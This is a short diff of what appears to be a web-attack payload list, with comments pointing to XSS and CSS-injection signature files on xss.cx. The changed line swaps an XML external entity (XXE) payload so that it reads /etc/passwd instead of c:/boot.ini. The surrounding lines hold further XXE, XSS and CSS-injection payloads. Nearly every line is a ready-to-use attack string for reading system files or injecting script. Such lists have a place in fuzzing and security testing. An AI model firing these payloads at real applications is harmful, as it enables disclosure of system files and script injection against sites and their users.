@@ -4,7 +4,7 @@
 /* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-css-injection-signatures-only-fools-dont-use.txt */
 /* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-xss-signatures-only-fools-dont-use.txt */
 /* RFI START */
-<!DOCTYPE	html[	<!ENTITY	%	foo	SYSTEM	"file:///c:/boot.ini">	%foo;]>	
+<!DOCTYPE	html[	<!ENTITY	%	foo	SYSTEM	"file:///etc/passwd">	%foo;]>	
 <!DOCTYPE html PUBLIC "" ""><style xmlns="http://www.w3.org/1999/xhtml ">*{animation-name:a}@-ms-keyframes a{0%{font:menu
 <!DOCTYPE html><script>(d=document).createElement("table").appendChild(d.createElement("head"))</script>
 <!ENTITY % three SYSTEM "file:///etc/passwd">
